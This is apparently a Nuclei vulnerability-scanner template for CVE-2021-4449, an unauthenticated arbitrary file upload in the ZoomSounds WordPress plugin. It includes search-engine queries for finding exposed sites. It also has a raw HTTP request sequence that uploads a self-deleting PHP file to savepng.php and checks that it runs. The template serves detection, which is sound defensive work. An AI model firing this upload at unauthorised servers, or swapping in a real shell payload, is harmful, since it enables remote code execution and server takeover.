id: CVE-2021-4449

info:
  name: ZoomSounds WordPress Plugin <= 5.96 - Unrestricted File Upload
  author: daffainfo
  severity: critical
  description: |
    ZoomSounds plugin for WordPress versions up to 5.96 contains a file upload vulnerability caused by missing file type validation in 'savepng.php', letting unauthenticated attackers upload arbitrary files.
  impact: |
    Successful exploitation allows unauthenticated attackers to upload arbitrary files, potentially leading to remote code execution or complete server compromise.
  remediation: |
    Update ZoomSounds plugin to version 5.97 or later to fix the unrestricted file upload vulnerability.
  reference:
    - https://wpscan.com/vulnerability/07259a61-8ba9-4dd0-8d52-cc1df389c0ad
    - https://sploitus.com/exploit?id=WPEX-ID:07259A61-8BA9-4DD0-8D52-CC1DF389C0AD
    - https://nvd.nist.gov/vuln/detail/CVE-2021-4449
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-4449
    cwe-id: CWE-434
    epss-score: 0.93526
    epss-percentile: 0.99818
    cpe: cpe:2.3:a:digitalzoomstudio:zoomsounds:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 3
    vendor: digitalzoomstudio
    product: zoomsounds
    framework: wordpress
    verified: true
    fofa-query: body="/wp-content/plugins/dzs-zoomsounds/"
    publicwww-query: "/wp-content/plugins/dzs-zoomsounds/"
    shodan-query: http.component:"zoomsounds"
  tags: cve,cve2021,wordpress,wp-plugin,zoomsounds,wpscan,file-upload,unauth,rce,intrusive,vkev,vuln

variables:
  filename: "{{rand_text_alpha(6)}}"
  string: "CVE-2021-4449"

http:
  - raw:
      - |
        POST /wp-content/plugins/dzs-zoomsounds/savepng.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
        Content-Type: application/x-php

        <?php echo md5("{{string}}"); unlink(__FILE__); ?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

      - |
        GET /wp-content/uploads/dzs-zoomsounds/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /wp-content/plugins/dzs-zoomsounds/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, md5(string)) || contains(body_3, md5(string))'
          - 'status_code_2 == 200 || status_code_3 == 200'
        condition: and
